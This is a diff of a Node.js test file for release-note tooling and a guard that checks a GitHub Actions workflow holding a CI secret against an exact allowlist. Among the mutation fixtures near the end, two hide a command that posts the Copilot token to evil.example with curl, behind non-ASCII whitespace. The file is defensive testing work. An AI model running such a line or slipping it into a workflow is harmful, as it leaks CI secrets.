@@ -204,7 +204,16 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
     assert.strictEqual(r.notes, `${rn.PREAMBLE}\n\n## ${h}\n\n- Change A.\n- Change B.\n`, 'exactly the tagged commit\'s fragments, after the fixed paragraph');
     assert.strictEqual(g(d, 'status', '--porcelain'), status, 'no tracked file changed');
     const sum = rn.summary(r, opts.tag);
-    assert.ok(sum.includes(`git switch -c <NNN>-fold-0.1.0-alpha.11 v0.1.0-alpha.11`) && sum.includes(`npm run changelog:build -- --release "${h}"`), 'the summary gives the fold PR commands, from the tag');
+    assert.ok(sum.includes(`git switch -c <NNN>-fold-alpha-11 v0.1.0-alpha.11`) && !/\.\d+-fold|fold-0\.1/.test(sum) && sum.includes(`npm run changelog:build -- --release "${h}"`), 'the summary gives the fold PR commands, from the tag');
+    // the fold branch name must pass the Spec Kit gate for every release tag shape (a dotted name fails CI: PR #740)
+    const GATE = /^[0-9]{3}-[a-z0-9][a-z0-9-]*$/;
+    for (const [t, want] of [['v0.1.0-alpha.11', 'fold-alpha-11'], ['v1.2.3', 'fold-1-2-3'], ['v1.2.3-rc.2', 'fold-rc-2'], ['v2.0.0-beta.10', 'fold-beta-10']]) {
+      const s2 = rn.summary({ kind: 'release', heading: 'h', previous: 'p', source: 'fragments', commits: 0 }, t);
+      const m2 = /git switch -c <NNN>-(\S+) /.exec(s2);
+      assert.ok(m2, `the summary prints a fold branch for ${t}`);
+      assert.strictEqual(m2[1], want, `${t}: fold branch slug`);
+      assert.ok(GATE.test(`123-${m2[1]}`), `${t}: 123-${m2[1]} passes the Spec Kit gate`);
+    }
     assert.ok(!/git push/.test(sum), 'the summary never tells anyone to push to main');
     // the CLI writes --out and appends to --summary
     const out = path.join(d, '..', `${path.basename(d)}-notes.md`);
@@ -296,6 +305,64 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
     assert.strictEqual(rn.previousRelease(d, g(d, 'rev-parse', 'v0.1.1-alpha.1^{commit}'), 'v0.1.1-alpha.1'), 'v0.1.0', 'v0.1.0 is newer than v0.1.0-alpha.10');
     g(d, 'checkout', '-q', 'v0.1.1-alpha.1');
     assert.throws(() => rn.releaseNotes(d, { ...opts, tag: 'v0.1.1-alpha.1' }), /no section for the previous release v0\.1\.0: merge its fold PR/, 'the unfolded final release is caught');
+  }
+  // --- spec 008 FR-129: a stable tag (v1.2.3) is a draft that is not a pre-release and is latest once published ---
+  {
+    for (const t of ['v1.2.3', 'v0.1.0', 'v10.20.30']) assert.deepStrictEqual(rn.releaseKind(t), { prerelease: false, latest: true }, `${t}: stable`);
+    for (const t of ['v0.1.0-alpha.19', 'v1.0.0-beta.2', 'v1.0.0-rc.1', 'v0.1.0-alpha.14-test.1', 'v1.2.3-test.4', 'v1.2.3-mcptest.1', 'v1.2.3-', 'nonsense', '', undefined, 'v1.2.3\nlatest']) {
+      assert.deepStrictEqual(rn.releaseKind(t), { prerelease: true, latest: false }, `${String(t)}: pre-release, never latest`);
+    }
+    assert.strictEqual(rn.publishCommand('v1.2.3'), 'gh release edit v1.2.3 --draft=false --latest');
+    assert.strictEqual(rn.publishCommand('v1.2.3-rc.1'), 'gh release edit v1.2.3-rc.1 --draft=false');
+    // the workflow output file
+    const d = repo('', {});
+    g(d, 'init', '-q', '-b', 'main');
+    pkg(d, '0.1.0-alpha.19');
+    commit(d, 'alpha.19');
+    g(d, 'tag', '-a', '-m', 'a19', 'v0.1.0-alpha.19');
+    // alpha.19's section is folded (verify requires it), then the stable version commit on main
+    const cl0 = fs.readFileSync(path.join(d, 'CHANGELOG.md'), 'utf8');
+    fs.writeFileSync(path.join(d, 'CHANGELOG.md'), `${cl0.trimEnd()}\n\n## v0.1.0-alpha.19 ([pre-release](x), 2026-10-23)\n\n- Old.\n`);
+    fs.writeFileSync(path.join(d, 'changelog.d', 'a.md'), '- Change A.\n');
+    pkg(d, '0.1.0');
+    commit(d, 'stable');
+    g(d, 'tag', '-a', '-m', 'stable', 'v0.1.0');
+    const r = rn.releaseNotes(d, { ...opts, tag: 'v0.1.0' });
+    assert.strictEqual(r.previous, 'v0.1.0-alpha.19');
+    assert.match(r.heading, /^v0\.1\.0 \(\[release\]\(https:\/\/github\.com\/three-feathers\/agent-durbar\/releases\/tag\/v0\.1\.0\), \d{4}-\d{2}-\d{2}\)$/, 'stable heading');
+    assert.ok(r.notes.startsWith(rn.STABLE_PREAMBLE), 'the stable intro');
+    assert.ok(!/alpha/i.test(r.notes.split('\n## ')[0]), 'no "alpha" in a stable release\'s intro');
+    assert.ok(/not code-signed or notarized|Not code-signed or notarized/.test(rn.STABLE_PREAMBLE) && rn.STABLE_PREAMBLE.includes('README'), 'still honest: unsigned, README pointers');
+    assert.ok(rn.PREAMBLE.includes('alpha'), 'the alpha intro is unchanged');
+    for (const [name, txt] of [['PREAMBLE', rn.PREAMBLE], ['STABLE_PREAMBLE', rn.STABLE_PREAMBLE]]) {
+      assert.ok(txt.includes('Needs at least one agent app signed in: GitHub Copilot, Claude Code or OpenAI Codex (Settings > Agent apps can install it).'), `${name} names every agent app`);
+      assert.ok(!/copilot login|Requires GitHub Copilot/.test(txt), `${name} no longer says Copilot is required`);
+      assert.ok(txt.includes('not affiliated with GitHub, Microsoft, Anthropic or OpenAI'), `${name} names all four companies`);
+    }
+    const sum = rn.summary(r, 'v0.1.0');
+    assert.ok(sum.includes('gh release edit v0.1.0 --draft=false --latest'), 'the summary gives the owner the publish command');
+    assert.ok(!rn.summary({ kind: 'release', heading: 'h', previous: 'p', source: 'fragments', commits: 0 }, 'v0.1.0-rc.1').includes('gh release edit'), 'no such command for a pre-release');
+    // the CLI writes what the workflow reads
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'durbar-out-'));
+    execFileSync(process.execPath, [path.join(__dirname, 'release-notes.js'), '--root', d, '--tag', 'v0.1.0', '--repo', opts.repo, '--main-ref', 'refs/heads/main', '--out', path.join(tmp, 'n.md'), '--github-output', path.join(tmp, 'out')], { env: gitEnv, stdio: 'ignore' });
+    assert.strictEqual(fs.readFileSync(path.join(tmp, 'out'), 'utf8'), 'prerelease=false\nlatest=true\n', 'the stable tag writes prerelease=false, latest=true');
+    // versionsort.suffix=-: the stable tag sorts above its own pre-releases, so the next release's previous is v0.1.0, not alpha.19
+    g(d, 'checkout', '-q', 'main');
+    fs.writeFileSync(path.join(d, 'changelog.d', 'b.md'), '- Change B.\n');
+    pkg(d, '0.1.1');
+    commit(d, 'next');
+    g(d, 'tag', '-a', '-m', 'next', 'v0.1.1');
+    assert.strictEqual(rn.previousRelease(d, g(d, 'rev-parse', 'v0.1.1^{commit}'), 'v0.1.1'), 'v0.1.0', 'v0.1.0 sorts above v0.1.0-alpha.19');
+    // the stable heading is accepted by changelog build/notes, and the Unreleased heading names the stable tag
+    const d2 = repo('', {});
+    fs.writeFileSync(path.join(d2, 'changelog.d', 'z.md'), '- Change Z.\n');
+    const sh = 'v1.2.3 ([release](https://example.invalid/r), 2026-10-26)';
+    const b = cl.build(d2, { release: sh, dryRun: true });
+    assert.ok(b.changed && b.text.includes(`## ${sh}`), 'stable heading accepted');
+    assert.ok(/after the v1\.2\.3 tag/.test(b.text), 'Unreleased heading names the stable tag');
+    const b2 = cl.build(d2, { release: 'v1.2.3-rc.2 ([pre-release](x), 2026-10-26)', dryRun: true });
+    assert.ok(/after the rc\.2 tag/.test(b2.text), 'pre-release form still accepted');
+    assert.throws(() => cl.build(d2, { release: 'release 1.2.3', dryRun: true }), /v0\.1\.0 \(\.\.\.\)/, 'error message shows the stable example');
   }
   // --- spec 008 FR-121..FR-124 (issue #658): test builds from branches ---
   {
@@ -472,16 +539,21 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
   assert.deepStrictEqual(Object.keys(jobs), ['verify', 'build', 'draft-release']);
   assert.match(wf, /^on:\n {2}push:\n {4}tags: \['v\*'\]\n\n/m, 'started by a tag push only');
   assert.match(wf, /^permissions:\n {2}contents: read\n/m, 'read-only by default');
-  assert.match(jobs.verify, /^ {4}permissions:\n {6}contents: read\n {4}steps:/m, 'verify: contents read only');
+  assert.match(jobs.verify, /^ {4}permissions:\n {6}contents: read\n {4}outputs:\n[^\n]*\n[^\n]*\n {4}steps:/m, 'verify: contents read only (and its two outputs)');
   assert.match(jobs.verify, /persist-credentials: false/, 'verify keeps no token in the checkout');
   assert.match(jobs.verify, /fetch-depth: 0/, 'verify sees main and every tag');
   assert.ok(!/npm ci|secrets\.|GH_TOKEN|github\.token/.test(jobs.verify), 'verify: no dependency install, no secret, no token');
   assert.match(jobs.verify, /node scripts\/release-notes\.js --tag "\$TAG" --repo "\$REPO" --main-ref refs\/remotes\/origin\/main --out release-notes\.md/, 'verify runs the checks on the tagged commit');
-  for (const j of ['verify', 'draft-release']) for (const l of jobs[j].split('\n').filter((x) => x.includes('${{'))) assert.match(l, /^ {10}(TAG|REPO|GH_TOKEN|GH_REPO): \$\{\{ github\.[a-z_]+ \}\}$/, `${j}: an expression only as an env value, never inside a run script: ${l.trim()}`);
+  for (const j of ['verify', 'draft-release']) for (const l of jobs[j].split('\n').filter((x) => x.includes('${{'))) assert.match(l, /^ {10}(TAG|REPO|GH_TOKEN|GH_REPO): \$\{\{ github\.[a-z_]+ \}\}$|^ {6}(prerelease|latest): \$\{\{ steps\.notes\.outputs\.(prerelease|latest) \}\}$|^ {10}(PRERELEASE|LATEST): \$\{\{ needs\.verify\.outputs\.(prerelease|latest) \}\}$/, `${j}: an expression only as an env value, never inside a run script: ${l.trim()}`);
   assert.ok(!/^ {4}permissions:/m.test(jobs.build) && /^ {4}needs: verify$/m.test(jobs.build), 'build: read-only default, only after verify');
   assert.match(jobs['draft-release'], /^ {4}needs: \[verify, build\]\n {4}permissions:\n {6}contents: write\n {4}steps:/m, 'draft-release alone may write, after both');
   assert.match(jobs['draft-release'], /pattern: agent-durbar-\*/, 'the packages only, not the notes file, become release assets');
-  assert.match(jobs['draft-release'], /gh release create "\$TAG" dist-artifacts\/\* --draft --prerelease --latest=false --verify-tag/, 'always a draft pre-release, never latest');
+  // spec 008 FR-129: always a draft; pre-release or not comes from verify's outputs (releaseKind), not a second rule in YAML
+  assert.match(jobs['draft-release'], /gh release create "\$TAG" dist-artifacts\/\* --draft "\$\{KIND\[@\]\}" --verify-tag/, 'always a draft');
+  assert.match(jobs['draft-release'], /\[ "\$PRERELEASE" = "true" \] && \[ "\$LATEST" = "false" \]; then\n\s+KIND=\(--prerelease --latest=false\)\n\s+elif \[ "\$PRERELEASE" = "false" \] && \[ "\$LATEST" = "true" \]; then\n\s+KIND=\(\) #/, 'a pre-release is never latest; a stable draft carries neither flag (latest is set at publish)');
+  assert.ok(!/\[ "\$TAG"|v\[0-9\]|\$\{TAG[#%/]/.test(jobs['draft-release']), 'no tag pattern in the draft job: verify decides');
+  assert.match(jobs.verify, /--github-output "\$GITHUB_OUTPUT"/, 'verify writes the release kind');
+  assert.match(jobs.verify, /^ {6}prerelease: \$\{\{ steps\.notes\.outputs\.prerelease \}\}\n {6}latest: \$\{\{ steps\.notes\.outputs\.latest \}\}$/m, 'verify exposes both values');
   assert.match(jobs['draft-release'], /--notes-file notes\/release-notes\.md/, 'the notes from verify');
   // spec 008 FR-124: the title comes from verify ("(test build)" for a test tag), through the notes artifact; a missing file stops the job
   assert.match(jobs.verify, /--out release-notes\.md --title-out release-title\.txt /, 'verify writes the title');
@@ -502,6 +574,128 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
   }
   assert.match(jobs['draft-release'], /if \[ "\$\(gh release view "\$TAG" --json isDraft -q \.isDraft\)" != "true" \]; then\n[^\n]*\n {14}exit 1\n {12}fi\n {12}gh release upload "\$TAG" dist-artifacts\/\* --clobber/, 'files are replaced only on a draft, a published release is refused');
   for (const [, u] of wf.matchAll(/uses: (\S+)/g)) assert.match(u, /^[\w.-]+\/[\w.-]+@[0-9a-f]{40}$/, `${u} pinned by commit sha`);
+}
+
+// --- spec 058 T160 (#509): the safety properties of .github/workflows/mcp-oauth-real.yml (a manual run with the real CI secret) ---
+// An exact structural allowlist: after dropping comments, blank lines and trailing spaces, EVERY line of the workflow must be the next
+// expected line below. Any other trigger, job, runner, matrix key, permission, input use or secret placement is an unexpected line.
+// Free text (name:/description: values, which may only hold text and ${{ matrix.os }}) and the pinned action SHAs may change.
+{
+  // plain text only (letters, digits, spaces and . , ( ) / + _ -), optionally in one pair of single quotes: no YAML syntax ({ } [ ] | > & * ! % @ # " ` ' inside, a colon)
+  const FIXED = (ind, dash) => new RegExp(`^ {${ind}}${dash}(?:name|description): (?:'[A-Za-z0-9][A-Za-z0-9 .,()/+_-]*'|[A-Za-z0-9][A-Za-z0-9 .,()/+_-]*)$`);
+  const SHA = (a) => new RegExp(`^ {6}- uses: actions/${a}@[0-9a-f]{40}$`);
+  const MATRIX_OS = "        os: ${{ fromJSON(inputs.oses == 'windows-and-ubuntu' && '[\"windows-latest\",\"ubuntu-latest\"]' || inputs.oses == 'windows-latest' && '[\"windows-latest\"]' || inputs.oses == 'ubuntu-latest' && '[\"ubuntu-latest\"]' || inputs.oses == 'macos-latest' && '[\"macos-latest\"]' || '[\"windows-latest\",\"ubuntu-latest\"]') }}";
+  const EXPECTED = [
+    FIXED(0, ''), 'on:', '  workflow_dispatch:', '    inputs:', '      oses:', '        type: choice', FIXED(8, ''),
+    '        required: true', '        default: windows-and-ubuntu', '        options:',
+    '          - windows-and-ubuntu', '          - windows-latest', '          - ubuntu-latest', '          - macos-latest',
+    'permissions:', '  contents: read', 'concurrency:', '  group: mcp-oauth-real', '  cancel-in-progress: false',
+    'jobs:', '  check:', FIXED(4, ''), '    runs-on: ${{ matrix.os }}', '    timeout-minutes: 20',
+    '    strategy:', '      fail-fast: false', '      matrix:', MATRIX_OS, '    steps:',
+    SHA('checkout'), '        with:', '          persist-credentials: false',
+    SHA('setup-node'), '        with:', '          node-version: 22', '          cache: npm',
+    '      - run: npm ci', '      - run: npx tsc -p tsconfig.scripts.json', '      - run: node dist-scripts/scripts/test-demo-oauth-mcp.js',
+    FIXED(6, '- '), '        shell: bash', '        env:',
+    '          COPILOT_GITHUB_TOKEN: ${{ secrets.COPILOT_CODEX_GITHUB_FINE_GRAINED_TOKEN }}',
+    '        run: node dist-scripts/scripts/mcp-oauth-real.js "$RUNNER_TEMP/mcp-oauth.json"',
+    FIXED(6, '- '), '        if: always()', '        shell: bash',
+    `        run: '[ -f "$RUNNER_TEMP/mcp-oauth.md" ] && cat "$RUNNER_TEMP/mcp-oauth.md" >> "$GITHUB_STEP_SUMMARY" || true'`,
+    SHA('upload-artifact'), '        if: always()', '        with:', FIXED(10, ''), '          path: |',
+    '            ${{ runner.temp }}/mcp-oauth.json', '            ${{ runner.temp }}/mcp-oauth.md',
+    '          retention-days: 30', '          if-no-files-found: ignore',
+  ];
+  const checkOauthWorkflow = (text) => {
+    const fail = (m) => { throw new assert.AssertionError({ message: `mcp-oauth-real.yml: ${m}` }); };
+    // CRLF to LF; drop comment lines, trailing ` # comment`, trailing spaces and blank lines, but keep each line's real number in the file.
+    // The body of the `path: |` block scalar is content for YAML (a `#` line or ` # x` there is part of the upload path): compared raw.
+    // Only printable ASCII, tab and LF may appear: JS `\s` matches NBSP and U+3000 but YAML starts a comment only after a space or tab,
+    // so a look-alike character could hide run content from this guard. Whitespace below is the YAML one: `[ \t]`, never `\s`.
+    const norm = text.replace(/\r\n?/g, '\n');
+    const bad = /[^\t\n\x20-\x7e]/.exec(norm);
+    if (bad) fail(`non-ASCII or control character U+${bad[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')} on file line ${norm.slice(0, bad.index).split('\n').length}: only printable ASCII, tab and newline are allowed in this file`);
+    const lines = [];
+    let block = false;
+    norm.split('\n').forEach((raw, idx) => {
+      if (block && (raw === '' || /^ {11}/.test(raw))) { lines.push({ n: idx + 1, l: raw }); return; }
+      block = false;
+      if (/^[ \t]*#/.test(raw)) return;
+      const l = raw.replace(/[ \t]+#.*$/, '').replace(/[ \t]+$/, '');
+      if (l === '') return;
+      lines.push({ n: idx + 1, l });
+      if (l === '          path: |') block = true;
+    });
+    const hint = ' (if this change is intended, update EXPECTED in scripts/test-changelog.js, spec 058 T160)';
+    // the secret boundary: `secrets.` once, on an env entry, never in a run body
+    const withSecret = lines.filter(({ l }) => /secrets\./i.test(l));
+    if (withSecret.length !== 1 || !/^ +\w+: \$\{\{ secrets\.\w+ \}\}$/.test(withSecret[0].l)) fail(`secrets. must appear exactly once, on an env: entry, got ${JSON.stringify(withSecret.map((x) => `line ${x.n}: ${x.l}`))}`);
+    lines.forEach(({ n, l }, i) => {
+      if (i >= EXPECTED.length) fail(`unexpected extra line ${n}: ${JSON.stringify(l)}${hint}`);
+      const e = EXPECTED[i];
+      // the free-text lines may hold text and the matrix label only
+      const probe = e instanceof RegExp ? l.replace(/\$\{\{ matrix\.os \}\}/g, 'X') : l;
+      if (e instanceof RegExp ? !e.test(probe) : l !== e) fail(`unexpected line ${n}: ${JSON.stringify(l)} (expected ${e instanceof RegExp ? `a line like ${e}` : JSON.stringify(e)})${hint}`);
+    });
+    if (lines.length < EXPECTED.length) fail(`missing line after file line ${lines.length ? lines[lines.length - 1].n : 0}: ${EXPECTED[lines.length]}${hint}`);
+  };
+  // read once with LF endings: the mutants below match on "\n"; the check itself also takes CRLF (a Windows checkout)
+  const file = fs.readFileSync(path.join(__dirname, '..', '.github', 'workflows', 'mcp-oauth-real.yml'), 'utf8').replace(/\r\n?/g, '\n');
+  checkOauthWorkflow(file);
+  checkOauthWorkflow(file.replace(/\n/g, '\r\n'));
+  // harmless edits stay green: a renamed step, a comment or trailing comment that says "inputs"/"write", other pinned SHAs
+  checkOauthWorkflow(file.replace('name: Summary', 'name: Write summary of the inputs'));
+  checkOauthWorkflow(file.replace('timeout-minutes: 20', 'timeout-minutes: 20 # inputs.x write-all'));
+  checkOauthWorkflow(file.replace('permissions:', '# inputs: write-all\npermissions:'));
+  checkOauthWorkflow(file.replace(/(actions\/checkout@)[0-9a-f]{40}/, '$1' + 'a'.repeat(40)));
+  const sub = (a, b) => file.replace(a, b);
+  const mutants = {
+    'type: string': [sub('type: choice', 'type: string'), /type: string/],
+    'fromJSON(inputs.oses)': [sub(/os: \$\{\{ fromJSON\(.*\) \}\}/, 'os: ${{ fromJSON(inputs.oses) }}'), /fromJSON\(inputs\.oses\) \}\}"/],
+    'an input in run:': [sub('- run: npm ci', '- run: echo ${{ inputs.oses }}'), /echo \$\{\{ inputs/],
+    'an input in a multi-line run:': [sub('- run: npm ci', '- run: |\n          echo ${{ inputs.oses }}'), /run: \|/],
+    'a self-hosted label': [sub('"macos-latest"', '"self-hosted"'), /self-hosted/],
+    'an extra option': [sub('- macos-latest\n', '- macos-latest\n          - self-hosted\n'), /- self-hosted/],
+    'write permission': [sub('contents: read', 'contents: write'), /contents: write/],
+    'a workflow_run trigger': [sub('  workflow_dispatch:\n', '  workflow_run:\n    workflows: [x]\n  workflow_dispatch:\n'), /workflow_run/],
+    'an issue_comment trigger': [sub('  workflow_dispatch:\n', '  issue_comment:\n  workflow_dispatch:\n'), /issue_comment/],
+    'a pull_request_target trigger': [sub('on:\n', 'on:\n  pull_request_target:\n'), /pull_request_target/],
+    'flow-style on': [sub('on:\n  workflow_dispatch:\n', 'on: [push, workflow_dispatch]\n  workflow_dispatch:\n'), /on: \[push/],
+    'job-level write-all': [sub('    timeout-minutes: 20\n', '    timeout-minutes: 20\n    permissions: write-all\n'), /write-all/],
+    'job-level contents write': [sub('    timeout-minutes: 20\n', '    timeout-minutes: 20\n    permissions:\n      contents: write\n'), /permissions:/],
+    'a second job on a custom runner': [`${file}  other:\n    runs-on: my-runner\n    steps:\n      - run: echo hi\n`, /other:/],
+    'a second string input as runs-on': [sub('      oses:\n', '      target:\n        type: string\n      oses:\n').replace('runs-on: ${{ matrix.os }}', 'runs-on: ${{ inputs.target }}'), /target:/],
+    'a second string input': [sub('      oses:\n', '      target:\n        type: string\n      oses:\n'), /target:/],
+    'FROMJSON of the input': [sub(/os: \$\{\{ fromJSON\(.*\) \}\}/, 'os: ${{ FROMJSON(inputs.oses) }}'), /FROMJSON/],
+    'an input in a github-script': [`${file.trimEnd()}\n      - uses: actions/github-script@0000000000000000000000000000000000000000\n        with:\n          script: console.log('\${{ inputs.oses }}')\n`, /github-script|extra line/],
+    'github.event.inputs': [sub('- run: npm ci', '- run: echo ${{ github.event.inputs.oses }}'), /github\.event\.inputs/],
+    'a fifth comparison': [sub("|| '[\"windows-latest\",\"ubuntu-latest\"]') }}", "|| inputs.oses == 'x' && '[\"y\"]' || '[\"windows-latest\",\"ubuntu-latest\"]') }}"), /inputs\.oses == 'x'/],
+    'runs-on from the input': [sub('runs-on: ${{ matrix.os }}', 'runs-on: ${{ inputs.oses }}'), /runs-on: \$\{\{ inputs/],
+    'matrix include on a custom runner': [sub('    steps:\n', '        include:\n          - os: my-runner\n    steps:\n'), /include:/],
+    'matrix include from a variable': [sub('    steps:\n', '        include:\n          - os: ${{ vars.RUNNER }}\n    steps:\n'), /include:/],
+    'github.event in a - run: line': [sub('- run: npm ci', '- run: echo "${{ github.event.sender.login }}"'), /github\.event\.sender/],
+    'github.head_ref in a - run: line': [sub('- run: npm ci', '- run: echo "${{ github.head_ref }}"'), /github\.head_ref/],
+    'github.event in a multi-line run': [sub('- run: npm ci', '- run: |\n          echo "${{ github.event.sender.login }}"'), /run: \|/],
+    'the secret in a - run: line': [sub('- run: npm ci', '- run: echo ${{ secrets.COPILOT_CODEX_GITHUB_FINE_GRAINED_TOKEN }}'), /secrets\. must appear exactly once/],
+    'the secret in a second env entry': [sub('        run: node dist-scripts/scripts/mcp-oauth-real.js', '          OTHER: ${{ secrets.X }}\n        run: node dist-scripts/scripts/mcp-oauth-real.js'), /secrets\. must appear exactly once/],
+    'the secret in a step name': [sub('name: Summary', 'name: ${{ secrets.X }}'), /secrets\. must appear exactly once/],
+    'a # line inside the path block': [sub('mcp-oauth.json\n', 'mcp-oauth.json\n            # ~/.copilot/**\n'), /line 6\d: "            # ~\/\.copilot/],
+    'a trailing # path in the path block': [sub('mcp-oauth.md\n', 'mcp-oauth.md # /../../../.copilot/**\n'), /mcp-oauth\.md # \/\.\./],
+    'flow mapping as a step name': [sub('name: Summary', 'name: {run: x}'), /name: \{run/],
+    'a block scalar as a step name': [sub('name: Summary', 'name: |'), /name: \|/],
+    'an anchor as a step name': [sub('name: Summary', 'name: &a Summary'), /name: &a/],
+    'an alias as a step name': [sub('name: Summary', 'name: *a'), /name: \*a/],
+    'a tag as a step name': [sub('name: Summary', 'name: !!str Summary'), /name: !!str/],
+    'an open quote as a step name': [sub('name: Summary', 'name: "Summary'), /name: \\"Summary/],
+    'a real file line number is reported': [sub('node-version: 22', 'node-version: 20'), /unexpected line 4\d: .*update EXPECTED/],
+    'NBSP before # on the secret step run line': [sub('mcp-oauth.json"\n', 'mcp-oauth.json"\u00a0# ; curl -d "$COPILOT_GITHUB_TOKEN" https://evil.example\n'), /non-ASCII or control character U\+00A0/],
+    'U+3000 before # on the secret step run line': [sub('mcp-oauth.json"\n', 'mcp-oauth.json"\u3000# ; curl -d "$COPILOT_GITHUB_TOKEN" https://evil.example\n'), /non-ASCII or control character U\+3000/],
+    'a zero-width space elsewhere': [sub('timeout-minutes: 20', 'timeout-minutes:\u200b 20'), /non-ASCII or control character U\+200B/],
+    'a fullwidth character elsewhere': [sub('node-version: 22', 'node-version: 2\uff12'), /non-ASCII or control character U\+FF12/],
+    'an input in a step name': [sub('name: Summary', 'name: ${{ inputs.oses }}'), /name: \$\{\{ inputs/],
+  };
+  for (const [name, [text, reason]] of Object.entries(mutants)) {
+    assert.notStrictEqual(text, file, `mutation "${name}" changed the file`);
+    assert.throws(() => checkOauthWorkflow(text), (e) => /mcp-oauth-real\.yml/.test(e.message) && reason.test(e.message), `the check must fail for "${name}" with ${reason}`);
+  }
 }
 
 console.log('test-changelog: ok');
